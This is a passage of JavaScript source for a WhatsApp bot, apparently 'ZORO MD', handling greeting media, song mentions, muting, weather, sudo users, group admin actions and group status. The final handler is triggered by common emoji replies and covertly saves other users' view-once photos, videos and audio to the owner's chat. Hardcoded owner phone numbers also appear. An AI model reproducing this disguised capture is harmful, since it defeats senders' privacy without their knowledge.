            targetMsg = isDirectPhoto ? S7.message.imageMessage : (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage);
        } else if (isDirectVideo || isQuotedVideo) {
            mediaType = 'video';
            targetMsg = isDirectVideo ? S7.message.videoMessage : (quotedMessage.videoMessage || quotedMessage.viewOnceMessage?.message?.videoMessage || quotedMessage.viewOnceMessageV2?.message?.videoMessage);
        } else if (isDirectAudio || isQuotedAudio) {
            mediaType = 'audio';
            targetMsg = isDirectAudio ? S7.message.audioMessage : quotedMessage.audioMessage;
        }

        try {
            const stream = await downloadContentFromMessage(targetMsg, mediaType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            const targetDir = path.join(process.cwd(), 'Love', 'gmsg');
            if (!fs.existsSync(targetDir)) {
                fs.mkdirSync(targetDir, { recursive: true });
            }

            let fileExt = '.jpg';
            if (mediaType === 'video') fileExt = '.mp4';
            if (mediaType === 'audio') fileExt = '.mp3';
            
            const timestamp = Date.now();
            const finalPath = path.join(targetDir, `greeting_${timestamp}${fileExt}`);
            fs.writeFileSync(finalPath, buffer);

            const captionText = args.slice(1).join(' ') || '';

            db[botNumber].gmsg.messages.push({
                enabled: true,
                type: mediaType,
                content: finalPath,
                caption: captionText,
                isGif: !!targetMsg.gifPlayback,
                delay: 2000
            });
            saveDB(db);

            await SYxS7.sendMessage(from, { react: { text: "🎬", key: S7.key } });
            return await SYHaTeReplay(`*Added ${mediaType} to sequence at position:* ${db[botNumber].gmsg.messages.length}`);

        } catch (err) {
            await SYxS7.sendMessage(from, { react: { text: "❌", key: S7.key } });
            return await SYHaTeReplay(`*Failed to process media:* ${err.message}`);
        }
    }

    else if (action === 'clear') {
        db[botNumber].gmsg = { messages: [] };
        saveDB(db);

        const targetDir = path.join(process.cwd(), 'Love', 'gmsg');
        if (fs.existsSync(targetDir)) {
            try {
                const files = fs.readdirSync(targetDir);
                for (const file of files) {
                    fs.unlinkSync(path.join(targetDir, file));
                }
            } catch (e) {}
        }

        await SYxS7.sendMessage(from, { react: { text: "🧹", key: S7.key } });
        return await SYHaTeReplay("*All greeting data has been cleared.*");
    }

    else if (action === 'status') {
        const flow = db[botNumber].gmsg.messages;
        if (!flow || flow.length === 0) {
            return await SYHaTeReplay("*Greeting sequence list is empty.*");
        }

        let statusMenu = `*ＧＲＥＥＴＩＮＧ  ＦＬＯＷ  ＳＴＡＴＵＳ*\n\n`;
        flow.forEach((msg, index) => {
            statusMenu += `*${index + 1}. [${msg.type.toUpperCase()}]*\n`;
            if (msg.type === 'text') {
                statusMenu += `   • Content: ${msg.content}\n`;
            } else {
                statusMenu += `   • File: .../${path.basename(msg.content)}\n`;
                if (msg.caption) statusMenu += `   • Caption: ${msg.caption}\n`;
            }
            statusMenu += `   • Delay: ${msg.delay}ms\n\n`;
        });
        
        return await SYHaTeReplay(statusMenu);
    }
}

function cleanupFiles(filePaths) {
    filePaths.forEach(fp => {
        if (fs.existsSync(fp)) {
            try { fs.unlinkSync(fp); } catch (e) {}
        }
    });
}

               
if (SYHaTeS7 === 'mset') {
    const botNumber = (SYxS7.user.id.split(':')[0] || SYxS7.user.id).split('@')[0] + '@s.whatsapp.net';
    const ffmpeg = require('fluent-ffmpeg');

    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].mention_song) {
        db[botNumber].mention_song = { groups: {}, title: "", body: "", thumb: "", largeThumb: false, sourceUrl: "" };
    }

    const args = text.split(/\s+/);
    const action = args[0]?.toLowerCase();
    const subAction = args[1]?.toLowerCase();

    if (action === 'delete') {
        const songFiles = fs.readdirSync(songPath).filter(f => f.endsWith('.opus'));
        
        if (songFiles.length === 0) return await SYHaTeReplay("*No songs found in the library.*");

        if (subAction === 'all') {
            songFiles.forEach(file => {
                fs.unlinkSync(path.join(songPath, file));
            });
            return await SYHaTeReplay(`*All ${songFiles.length} songs have been deleted from the library.*`);
        }

        if (!args[1]) {
            let list = "*MENTION SONG LIST*\n\n";
            songFiles.forEach((file, i) => {
                list += `${i + 1}. ${file}\n`;
            });
            list += `\n> Use \`${prefix}mset delete [number]\` to remove a specific song.\n> Use \`${prefix}mset delete all\` to clear everything.`;
            return await SYHaTeReplay(list);
        }

        const index = parseInt(args[1]) - 1;
        if (isNaN(index) || !songFiles[index]) return await SYHaTeReplay("*Invalid song number!*");

        const fileToDelete = path.join(songPath, songFiles[index]);
        fs.unlinkSync(fileToDelete);
        return await SYHaTeReplay(`*${songFiles[index]} has been removed successfully.*`);
    }

    if (action === 'on' && subAction === 'all') {
        const groups = await SYxS7.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        groupIds.forEach(id => {
            db[botNumber].mention_song.groups[id] = true;
        });
        saveDB(db);
        return await SYHaTeReplay(`*MENTION SONG*\n\n> *Status: ENABLED for ALL groups (${groupIds.length})*`);
    }

    if (action === 'off' && subAction === 'all') {
        db[botNumber].mention_song.groups = {}; 
        saveDB(db);
        return await SYHaTeReplay(`*MENTION SONG*\n\n> *Status: DISABLED for ALL groups*`);
    }

    if (action === 'on' || action === 'off') {
        if (!isGroup) return await SYHaTeReplay(onlygc);
        db[botNumber].mention_song.groups[from] = (action === 'on');
        saveDB(db);
        return await SYHaTeReplay(`*MENTION SONG*\n\n> *Status: ${action.toUpperCase()}*`);
    }

    else if (action === 'song') {
        const links = args.slice(1).filter(link => link.startsWith('http'));
        if (links.length === 0) return await SYHaTeReplay(`*Provide links!*`);
        await SYHaTeReplay(`*Processing ${links.length} songs...*`);

        for (let link of links) {
            try {
                const fileName = `song_${Date.now()}`;
                const finalFile = path.join(songPath, `${fileName}.opus`);
                const tempFile = path.join(songPath, `${fileName}.tmp`);

                const response = await axios({ url: link, method: 'GET', responseType: 'stream' });
                const writer = fs.createWriteStream(tempFile);
                response.data.pipe(writer);

                await new Promise((resolve) => writer.on('finish', resolve));

                ffmpeg(tempFile)
                    .audioCodec('libopus')
                    .audioChannels(1)
                    .audioFrequency(16000)
                    .toFormat('opus')
                    .on('end', () => { if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile); })
                    .on('error', () => { if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile); })
                    .save(finalFile);
            } catch (e) { console.log(`Failed: ${link}`, e.message); }
        }
        return await SYHaTeReplay(`*Songs added.*`);
    }

    else if (action === 'title') {
        db[botNumber].mention_song.title = text.split(' ').slice(1).join(' ');
        saveDB(db);
        return await SYHaTeReplay("*Title updated!*");
    }
    else if (action === 'body') {
        db[botNumber].mention_song.body = text.split(' ').slice(1).join(' ');
        saveDB(db);
        return await SYHaTeReplay("*Body updated!*");
    }
    else if (action === 'thumb') {
        db[botNumber].mention_song.thumb = args[1];
        saveDB(db);
        return await SYHaTeReplay("*Thumbnail updated!*");
    }
    else if (action === 'size') {
        const targetSize = args[1]?.toLowerCase();
        if (targetSize === 'big' || targetSize === 'large') {
            db[botNumber].mention_song.largeThumb = true;
        } else if (targetSize === 'small' || targetSize === 'mini') {
            db[botNumber].mention_song.largeThumb = false;
        } else {
            return await SYHaTeReplay("*Allowed parameters are only big or small.*\n*Example: mset size big*");
        }
        saveDB(db);
        return await SYHaTeReplay(`*Layout render mode set to ${targetSize.toUpperCase()}.*`);
    }
    else if (action === 'url' || action === 'link') {
        const newUrl = args[1];
        if (!newUrl || !newUrl.startsWith('http')) return await SYHaTeReplay("*Target link destination must start with http:// or https://*");
        db[botNumber].mention_song.sourceUrl = newUrl;
        saveDB(db);
        return await SYHaTeReplay("*Redirection link mapping changed!*");
    }

    else {
        const menu = `*ＭＥＮＴＩＯＮ  ＳＯＮＧ  ＰＡＮＥＬ*

*Control:*
> ${prefix}mset on/off
> ${prefix}mset on all
> ${prefix}mset off all
> ${prefix}mset song [links...]
> ${prefix}mset delete [number]
> ${prefix}mset delete all

*Custom UI:*
> ${prefix}mset title [text]
> ${prefix}mset body [text]
> ${prefix}mset thumb [url]
> ${prefix}mset size [big/small]
> ${prefix}mset url [link]`;
        return await SYHaTeReplay(menu);
    }
}





if (SYHaTeS7 === 'mute') {
    if (!isGroup) return await SYHaTeReplay("❌ This command can only be used in groups!");

    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
    
    const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
    const senderLid = (S7.key.participant || '').split(':')[0].split('@')[0];

    const isSenderAdmin = participants.some(p => p.id.split('@')[0] === senderLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    if (!isSenderAdmin && !S7.key.fromMe) return await SYHaTeReplay("❌ *Admin Only Command!* You must be an admin to use this.");

    let targetLid = "";
    let durationInput = "";

    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;

    if (quotedMessage) {
        targetLid = (contextInfo.participant || '').split(':')[0].split('@')[0];
        durationInput = text.trim();
    } else {
        const args = text.split(' ');
        const mention = args[0];
        if (!mention || !mention.includes('@')) return await SYHaTeReplay(`Please mention or quote a user!\nExample: ${prefix}mute @userlid 1h`);
        targetLid = mention.replace('@', '').split(':')[0];
        durationInput = args[1] || "";
    }

    if (!targetLid) return await SYHaTeReplay("❌ Could not resolve target user's LID.");
    if (targetLid === myLid) return await SYHaTeReplay("❌ You cannot mute the bot itself.");

    let expiresAt = null;
    let durationText = "Permanently";

    if (durationInput) {
        const timeValue = parseInt(durationInput);
        const timeUnit = durationInput.replace(timeValue, '').toLowerCase().trim();

        if (!isNaN(timeValue)) {
            let ms = 0;
            if (timeUnit === 'm') ms = timeValue * 60 * 1000;
            else if (timeUnit === 'h') ms = timeValue * 60 * 60 * 1000;
            else if (timeUnit === 'd') ms = timeValue * 24 * 60 * 60 * 1000;

            if (ms > 0) {
                expiresAt = Date.now() + ms;
                durationText = `${timeValue} ${timeUnit === 'm' ? 'Minutes' : timeUnit === 'h' ? 'Hours' : 'Days'}`;
            }
        }
    }

    if (!db[dbKey]) db[dbKey] = {};
    if (!db[dbKey].muted_users) db[dbKey].muted_users = {};
    if (!db[dbKey].muted_users[from]) db[dbKey].muted_users[from] = {};

    db[dbKey].muted_users[from][targetLid] = { expiresAt };
    saveDB(db);

    return await SYHaTeReplay(`🚫 *MUTED:* User @${targetLid} has been muted.\n> *Duration:* ${durationText}`);
}

if (SYHaTeS7 === 'unmute') {
    if (!isGroup) return await SYHaTeReplay("❌ This command can only be used in groups!");

    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
    
    const senderLid = (S7.key.participant || '').split(':')[0].split('@')[0];

    const isSenderAdmin = participants.some(p => p.id.split('@')[0] === senderLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    if (!isSenderAdmin && !S7.key.fromMe) return await SYHaTeReplay("❌ *Admin Only Command!* You must be an admin to use this.");

    let targetLid = "";

    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;

    if (quotedMessage) {
        targetLid = (contextInfo.participant || '').split(':')[0].split('@')[0];
    } else {
        const mention = text.split(' ')[0];
        if (!mention || !mention.includes('@')) return await SYHaTeReplay(`Please mention or quote a user!\nExample: ${prefix}unmute @userlid`);
        targetLid = mention.replace('@', '').split(':')[0];
    }

    if (!targetLid) return await SYHaTeReplay("❌ Could not resolve target user's LID.");

    if (!db[dbKey]?.muted_users?.[from]?.[targetLid]) {
        return await SYHaTeReplay(`⚠️ User @${targetLid} is not muted in this group.`);
    }

    delete db[dbKey].muted_users[from][targetLid];
    saveDB(db);

    return await SYHaTeReplay(`🔊 *UNMUTED:* User @${targetLid} has been unmuted successfully.`);
}




if (SYHaTeS7 === 'weather') {
    if (!text) return await SYHaTeReplay(`Invalid format!\nExample: ${prefix}weather india|west bengal\nOr: ${prefix}weather kolkata`);

    const axios = require('axios');
    let query = text.trim();

    if (query.includes('|')) {
        const parts = query.split('|');
        query = `${parts[1].trim()}, ${parts[0].trim()}`;
    }

    try {
        const response = await axios.get(`https://wttr.in/${encodeURIComponent(query)}?format=%c+%t+%C+%h+%w`, {
            timeout: 10000
        });

        let raw = response.data.trim();

        if (!raw || raw.includes('404') || raw.length < 10) {
            return await SYHaTeReplay("❌ Location not found! Please check the spelling.");
        }

        raw = raw.replace(/↑/g, ' ↑');
        const parts = raw.split(/\s+/).filter(Boolean);

        const weatherReport = `*🌤️ ＷＥＡＴＨＥＲ  ＲＥＰＯＲＴ*

> *Location:* ${query.toUpperCase()}
> *Condition:* ${parts[2] || 'N/A'}
> *Temperature:* ${parts[1] || 'N/A'}
> *Humidity:* ${parts[3] || 'N/A'}
> *Wind:* ${parts[4] || ''} ${parts[5] || ''}`.trim();

        return await SYHaTeReplay(weatherReport);

    } catch (e) {
        console.log('Weather API Error:', e.message);
        
        if (e.code === 'ECONNREFUSED' || e.code === 'ETIMEDOUT') {
            return await SYHaTeReplay("❌ Weather service is temporarily down. Try again later.");
        }
        
        return await SYHaTeReplay("❌ Error fetching weather data!");
    }
}


if (SYHaTeS7 === 'pcmd') {
    if (!isOwner) return await SYHaTeReplay(owneronly);

    const action = args[0]?.toLowerCase();
    const targetCmd = args[1]?.toLowerCase();

    if (!db[botNumber].public_cmds) db[botNumber].public_cmds = [];

    if (action === 'add') {
        if (!targetCmd) return await SYHaTeReplay(`*Invalid Format*\n> Use: ${prefix}pcmd add [command]`);
        
        if (db[botNumber].public_cmds.includes(targetCmd)) {
            return await SYHaTeReplay(`> ${prefix}${targetCmd} is already in the public list.`);
        }
        
        db[botNumber].public_cmds.push(targetCmd);
        saveDB(db);
        return await SYHaTeReplay(`> ${prefix}${targetCmd} is now public and will bypass self mode.`);
    }

    if (action === 'del' || action === 'delete') {
        if (!targetCmd) return await SYHaTeReplay(`*Invalid Format*\n> Use: ${prefix}pcmd del [command]`);
        
        if (!db[botNumber].public_cmds.includes(targetCmd)) {
            return await SYHaTeReplay(`> ${prefix}${targetCmd} was not found in the public list.`);
        }
        
        db[botNumber].public_cmds = db[botNumber].public_cmds.filter(cmd => cmd !== targetCmd);
        saveDB(db);
        return await SYHaTeReplay(`> ${prefix}${targetCmd} has been removed from the public list.`);
    }

    if (action === 'list') {
        if (db[botNumber].public_cmds.length === 0) {
            return await SYHaTeReplay(`> No commands are currently set to public.`);
        }
        
        let listMsg = `*Public Commands List*\n`;
        db[botNumber].public_cmds.forEach((cmd, i) => {
            listMsg += `> ${i + 1}. ${prefix}${cmd}\n`;
        });
        return await SYHaTeReplay(listMsg.trim());
    }

    return await SYHaTeReplay(
        `*ＰＣＭＤ  ＭＡＮＡＧＥＭＥＮＴ  ＰＡＮＥＬ*\n\n` +
        `*Control:*\n` +
        `> ${prefix}pcmd add [command]\n` +
        `> ${prefix}pcmd del [command]\n` +
        `> ${prefix}pcmd list\n\n` +
        `_Note: This allows specified public commands to bypass self mode._`
    );
}





if (SYHaTeS7 === 'promote') {
    if (!isGroup) return await SYHaTeReplay(onlygc);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const isSenderAdmin = participants.find(p => getPureNumber(p.id) === S7_Lover_Number)?.admin !== null;
    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");

    let target = S7.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || S7.message?.extendedTextMessage?.contextInfo?.participant;
    if (!target) return await SYHaTeReplay("❌ *Please mention or reply to a user to promote!*");

    try {
        await SYxS7.groupParticipantsUpdate(from, [target], "promote");
        return await SYHaTeReplay(`✅ *@${target.split('@')[0]} has been promoted to Admin!*`, { mentions: [target] });
    } catch (error) {
        return await SYHaTeReplay("❌ *Action failed. I am not an admin!*");
    }
}

if (SYHaTeS7 === 'demote') {
    if (!isGroup) return await SYHaTeReplay(onlygc);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const isSenderAdmin = participants.find(p => getPureNumber(p.id) === S7_Lover_Number)?.admin !== null;

    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");

    let target = S7.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || S7.message?.extendedTextMessage?.contextInfo?.participant;
    if (!target) return await SYHaTeReplay("❌ *Please mention or reply to a user to demote!*");

    try {
        await SYxS7.groupParticipantsUpdate(from, [target], "demote");
        return await SYHaTeReplay(`✅ *@${target.split('@')[0]} has been demoted!*`, { mentions: [target] });
    } catch (error) {
        return await SYHaTeReplay("❌ *Action failed. I am not an admin!*");
    }
}

if (SYHaTeS7 === 'sudo') {
    const isRealOwner = sender === '917365085213@s.whatsapp.net' || S7.key.fromMe;
    if (!isRealOwner) return await SYHaTeReplay(owneronly);

    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].sudoUsers) db[botNumber].sudoUsers = [];

    const action = args[0]?.toLowerCase();

    if (!action) {
        return await SYHaTeReplay(`*ＳＵＤＯ  ＵＳＥＲ  ＳＥＴＴＩＮＧＳ*\n\n*Commands:*\n> ${prefix}sudo add [number / reply]\n> ${prefix}sudo del [number / reply]\n> ${prefix}sudo list\n\n*Note:* Sudo users can operate all administrative and owner commands except configuring the sudo list itself.`);
    }

    if (action === 'add') {
        let targetNum = "";
        
        if (contextInfo?.participant) {
            targetNum = contextInfo.participant.split('@')[0];
        } else if (args[1]) {
            targetNum = args[1].replace(/[^0-9]/g, '');
        }

        if (!targetNum) return await SYHaTeReplay(`⚠️ *Sudo Add Error:*\n\n> Please provide a valid number or reply/quote to a user.\n\n*Example:* ${prefix}sudo add 917001531350`);
        if (targetNum === '917365085213' || targetNum === botNumber.split('@')[0]) {
            return await SYHaTeReplay("❌ *Action Denied:* You cannot add yourself or the bot as a sudo user!");
        }

        if (db[botNumber].sudoUsers.includes(targetNum)) {
            return await SYHaTeReplay(`⚠️ *@${targetNum}* is already in the Sudo database!`, { mentions: [`${targetNum}@s.whatsapp.net`] });
        }

        db[botNumber].sudoUsers.push(targetNum);
        saveDB(db);
        return await SYHaTeReplay(`✅ *ＳＵＤＯ  ＵＳＥＲ  ＡＤＤＥＤ*`);
    } 
    
    else if (action === 'del' || action === 'delete') {
        let targetNum = "";

        if (contextInfo?.participant) {
            targetNum = contextInfo.participant.split('@')[0];
        } else if (args[1]) {
            targetNum = args[1].replace(/[^0-9]/g, '');
        }

        if (!targetNum) return await SYHaTeReplay(`⚠️ *Sudo Delete Error:*\n\n> Please provide a valid number or reply/quote to remove.\n\n*Example:* ${prefix}sudo del 917001531350`);

        if (!db[botNumber].sudoUsers.includes(targetNum)) {
            return await SYHaTeReplay(`❌ *User Not Found:* @${targetNum} is not a sudo user!`, { mentions: [`${targetNum}@s.whatsapp.net`] });
        }

        db[botNumber].sudoUsers = db[botNumber].sudoUsers.filter(u => u !== targetNum);
        saveDB(db);
        return await SYHaTeReplay(`📴 *ＳＵＤＯ  ＵＳＥＲ  ＲＥＭＯＶＥＤ*`);
    } 
    
    else if (action === 'list') {
        if (db[botNumber].sudoUsers.length === 0) {
            return await SYHaTeReplay("*ＳＵＤＯ  ＵＳＥＲ  ＬＩＳＴ*\n\n> No sudo users found in the database.");
        }

        let listText = `*ＳＵＤＯ  ＵＳＥＲ  ＬＩＳＴ*\n\n`;
        let mentions = [];
        db[botNumber].sudoUsers.forEach((user, index) => {
            listText += `> ${index + 1}. @${user}\n`;
            mentions.push(`${user}@s.whatsapp.net`);
        });

        return await SYHaTeReplay(listText, { mentions: mentions });
    }
}


if (SYHaTeS7 === 'antibot') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    if (!isOwner) return SYHaTeReplay(owneronly);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    let currentStatus = "❌ Off";
    if (db[from].antibot === 'on') currentStatus = "🗑️ Delete Only";
    if (db[from].antibot === 'kick') currentStatus = "🚫 Kick Mode";
    if (db[from].antibot === 'warn') currentStatus = "⚠️ Warning Mode";

    if (args[0] === 'set' && args[1] === 'kick') {
        db[from].antibot = 'kick';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Bot set to Kick Mode!*");
    } else if (args[0] === 'set' && args[1] === 'delete') {
        db[from].antibot = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Bot set to Delete Only Mode!*");
    } else if (args[0] === 'set' && args[1] === 'warn') {
        db[from].antibot = 'warn';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Bot set to Warning Mode!*");
    } else if (args[0] === 'on') {
        db[from].antibot = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Bot turned ON!*");
    } else if (args[0] === 'off') {
        db[from].antibot = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Anti-Bot turned OFF!*");
    } else {
        return SYHaTeReplay(`*ＡＮＴＩ  -  ＢＯＴ*\n\nStatus: ${currentStatus}\nAdmin Status: ${isBotAdmin ? '✅ Verified' : '❌ Not Admin'}\n\n*Commands:*\n> ${prefix}antibot set kick\n> ${prefix}antibot set delete\n> ${prefix}antibot set warn\n> ${prefix}antibot on\n> ${prefix}antibot off`);
    }
}

if (SYHaTeS7 === 'quote') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    if (!db[botNumber]) db[botNumber] = {};

    if (text === 'on') {
        db[botNumber].quote = true;
        saveDB(db);
        return await SYHaTeReplay("✅ *Quote is now ON*");
    } 
    else if (text === 'off') {
        db[botNumber].quote = false;
        saveDB(db);
        return await SYHaTeReplay("❌ *Quote is now OFF*");
    } 
    else {
        return await SYHaTeReplay(`*Usage:* ${prefix}quote on/off`);
    }
}

if (SYHaTeS7 === 'device' || SYHaTeS7 === 'cekdevice') {
    try {
        const contextInfo = S7.message?.extendedTextMessage?.contextInfo || 
                            S7.message?.imageMessage?.contextInfo || 
                            S7.message?.videoMessage?.contextInfo;

        const quotedId = contextInfo?.stanzaId;
        if (!quotedId) return await SYHaTeReplay("❌ Please *reply* to a message.");

        let deviceType = "";
        const idLength = quotedId.length;

        if (idLength >= 32) {
            deviceType = "📱 *Android*";
        } else if (quotedId.startsWith("3A")) {
            deviceType = "🍎 *iOS (iPhone)*";
        } else if (idLength <= 22 || quotedId.startsWith("3EB0")) {
            deviceType = "🤖 *Bot / WhatsApp Web*";
        } else {
            deviceType = "❓ *Unknown Structure*";
        }

        await SYHaTeReplay(`*ＤＥＶＩＣＥ  ＣＨＥＣＫＥＲ*\n\n> *Detected:* ${deviceType}\n> *ID Length:* ${idLength}\n> *ID Prefix:* ${quotedId.substring(0, 5)}...`);
    } catch (err) {
        console.error(err);
    }
}





if (SYHaTeS7 === 'gstatus' || SYHaTeS7 === 'upset') {
    const isOwner = S7.key.fromMe || sender === '135747541700705@lid' || sender === '917365085213@s.whatsapp.net';
    if (!isOwner) return await SYHaTeReplay("❌ *Owner Only Command!*");

    const { prepareWAMessageMedia, downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const crypto = require('crypto');
    
    const targetJid = text.trim().endsWith('@g.us') ? text.trim() : from;
    const caption = text.trim() || "";
    
    let quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;

    const generateMessageID = () => crypto.randomUUID().replace(/-/g, "").toUpperCase().slice(0, 20);

    const randomArgbColor = () => {
        const colors = [
            0xff128c7e, 0xff075e54, 0xff1da1f2, 0xffe74c3c, 0xff9b59b6, 0xfff39c12, 
            0xff2c3e50, 0xffe91e63, 0xff00bcd4, 0xff8bc34a, 0xffff5722, 0xff607d8b
        ];
        return colors[Math.floor(Math.random() * colors.length)];
    };

    try {
        let finalMessageContent = {};

        if (quoted) {
            if (quoted.viewOnceMessageV2?.message) quoted = quoted.viewOnceMessageV2.message;
            else if (quoted.viewOnceMessage?.message) quoted = quoted.viewOnceMessage.message;
            else if (quoted.ephemeralMessage?.message) quoted = quoted.ephemeralMessage.message;

            const qType = Object.keys(quoted)[0];
            const mediaTypes = ["imageMessage", "videoMessage", "audioMessage", "documentMessage"];

            if (mediaTypes.includes(qType)) {
                const mediaType = qType.replace('Message', '');
                const stream = await downloadContentFromMessage(quoted[qType], mediaType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                if (buffer.length === 0) {
                    return await SYHaTeReplay("❌ *Failed to download media buffer!*");
                }

                let mediaOptions = {};
                if (qType === "imageMessage") mediaOptions = { image: buffer };
                else if (qType === "videoMessage") mediaOptions = { video: buffer };
                else if (qType === "audioMessage") mediaOptions = { audio: buffer, ptt: !!quoted[qType].ptt };
                else if (qType === "documentMessage") mediaOptions = { document: buffer };

                const uploadedMedia = await prepareWAMessageMedia(mediaOptions, { upload: SYxS7.waUploadToServer });
                
                if (uploadedMedia[qType]) {
                    if (qType === "imageMessage" || qType === "videoMessage") {
                        uploadedMedia[qType].caption = caption || quoted[qType].caption || "";
                    } else if (qType === "audioMessage") {
                        uploadedMedia[qType].mimetype = quoted[qType].mimetype || "audio/mp4";
                    } else if (qType === "documentMessage") {
                        uploadedMedia[qType].mimetype = quoted[qType].mimetype || "application/octet-stream";
                        uploadedMedia[qType].fileName = quoted[qType].fileName || "file";
                    }
                }

                finalMessageContent = uploadedMedia;
            } else {
                const quotedText = quoted.conversation || quoted.extendedTextMessage?.text || "ZORO MD STATUS";
                finalMessageContent = {
                    extendedTextMessage: {
                        text: quotedText,
                        backgroundColor: randomArgbColor(),
                        font: 1
                    }
                };
            }
        } else {
            if (!caption) return await SYHaTeReplay("❌ *Please provide text or reply to media!*");
            
            finalMessageContent = {
                extendedTextMessage: {
                    text: caption,
                    backgroundColor: randomArgbColor(),
                    font: 1
                }
            };
        }

        await SYxS7.relayMessage(targetJid, {
            groupStatusMessageV2: {
                message: finalMessageContent,
            },
        }, {
            messageId: generateMessageID(),
        });

        return await SYHaTeReplay(`✅ *Status Updated Successfully in:* \n${targetJid}`);

    } catch (error) {
        console.error("GSTATUS Media Error:", error);
        return await SYHaTeReplay(`*_Failed to set group status_*\n\`${error.message}\``);
    }
}



if (SYHaTeS7 === '🙂' || SYHaTeS7 === '😂' || SYHaTeS7 === '😩' || SYHaTeS7 === '🤣' || SYHaTeS7 === '😊' || SYHaTeS7 === '😍' || SYHaTeS7 === '😘' || SYHaTeS7 === '🥰' || SYHaTeS7 === '😁' || SYHaTeS7 === '😎' || SYHaTeS7 === '🤔' || SYHaTeS7 === '😭' || SYHaTeS7 === '😡' || SYHaTeS7 === '🥳') {
    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

        const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;

        if (!quoted) return;

        let vMessage =
            quoted.viewOnceMessageV2?.message ||
            quoted.viewOnceMessage?.message ||
            quoted;

        let mediaType = null;
        let mediaKey = null;

        if (vMessage.imageMessage) {
            mediaType = 'image';
            mediaKey = vMessage.imageMessage;
        } else if (vMessage.videoMessage) {
            mediaType = 'video';
            mediaKey = vMessage.videoMessage;
        } else if (vMessage.audioMessage) {
            mediaType = 'audio';
            mediaKey = vMessage.audioMessage;
        }

        if (!mediaKey) {
            if (quoted.imageMessage?.viewOnce) {
                mediaType = 'image';
                mediaKey = quoted.imageMessage;
            } else if (quoted.videoMessage?.viewOnce) {
                mediaType = 'video';
                mediaKey = quoted.videoMessage;
            } else if (quoted.audioMessage?.viewOnce) {
                mediaType = 'audio';
                mediaKey = quoted.audioMessage;
            }
        }

        if (!mediaKey || !mediaType) return;

        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '⏳', key: S7.key }
        });

        const stream = await downloadContentFromMessage(mediaKey, mediaType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const rawJid = SYxS7.user?.id;
        const S7_myJid = rawJid.includes(':') ? rawJid.split(':')[0] + '@s.whatsapp.net' : rawJid;
        const originalSender = S7.key.participant || S7.key.remoteJid;

        const caption = mediaKey.caption 
            ? `${mediaKey.caption}\n\n👤 *Sent by:* @${originalSender.split('@')[0]}`
            : `✅ *View-Once ${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)} Downloaded*\n👤 *Sent by:* @${originalSender.split('@')[0]}`;

        if (mediaType === 'image') {
            await SYxS7.sendMessage(S7_myJid, {
                image: buffer,
                caption: caption,
                mentions: [originalSender]
            });
        } else if (mediaType === 'video') {
            await SYxS7.sendMessage(S7_myJid, {
                video: buffer,
                caption: caption,
                mentions: [originalSender]
            });
        } else if (mediaType === 'audio') {
            await SYxS7.sendMessage(S7_myJid, {
                audio: buffer,
                mimetype: mediaKey.mimetype || 'audio/mp4',
                ptt: mediaKey.ptt || false,
                contextInfo: {
                    mentionedJid: [originalSender],
                    externalAdReply: {
                        title: `🎵 View-Once Audio From @${originalSender.split('@')[0]}`,
                        body: '© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓Ｅ',
                        mediaType: 1,
                        renderLargerThumbnail: false
                    }
                }
            });
        }

        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '✅', key: S7.key }
        });

